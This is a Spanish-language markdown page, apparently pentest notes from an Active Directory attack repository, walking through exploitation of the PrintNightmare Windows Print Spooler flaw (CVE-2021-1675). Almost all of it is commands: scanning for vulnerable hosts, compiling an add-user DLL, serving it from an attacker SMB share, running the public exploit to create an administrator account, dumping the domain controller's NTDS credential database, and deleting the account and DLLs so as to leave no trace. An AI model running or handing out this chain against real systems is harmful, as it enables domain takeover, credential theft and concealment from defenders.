# PrintNighmare

Para este ataque se va a aprovechar una vulnerabilidad en el servicio spooler de Windows para añadir un usuario con permisos de administrador. Tener en cuenta que para no dejar rastro después haya que eliminar el usuario y los dll subidos en el equipo víctima

```Bash
# Comprobamos que el equipo es vulnerable
poetry run crackmapexec smb <Rango de IPs> -u <user> -p <pass> -M spooler

# Obtenemos el fichero .c para añadir usuario del repositorio de Github: https://github.com/newsoft/adduser y lo compilamos
x86_64-w64-mingw32-gcc -shared -opnightmare2.dll adduser.c -lnetapi32

# Levantamos una carpeta compartida para que el equipo victima obtenga la dll que heoms creado
impacket-smbserver -smb2support ATTACKERSHARE .

# Ejecutamos el exploit CVE-2021-1675.py obtenido del repositorio de Github: https://github.com/cube0x0/CVE-2021-1675
python3 CVE-2021-1675.py <dominio>/<user>:'<pass>'@<DNS del equipo victima> '\\<Nuestra IP>\ATTACKERSHARE\pnightmare2.dll'
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/pritnightmare/vid.gif?raw=true "Check de printnighmare y esploit")

```Bash
# Comprobación de que el usuario printnighmare con permisos de administrador ha sido creado
cme smb <IP víctima> -u pnightmare2 -p 'Test123456789!'

# Si es un DC volcar el NTDS
cme smb <IP víctima> -u pnightmare2 -p 'Test123456789!' --ntds
 
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/printnighmare/vid2.gif?raw=true "Explotar el nuevo usuario")


## Para eliminar el rastro ver:
[Añadir/Eliminar usuarios](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/utilities/add_remove_users)
## PAra borrar las ddl se encuentran en las siguietnes ubicaciones de windows con el nombre de printnighmare*.dll
```Bash
C:\Windows\System32\spool\drivers\x64\3
C:\Windows\System32\spool\drivers\x64\3\Old\{id}\
```
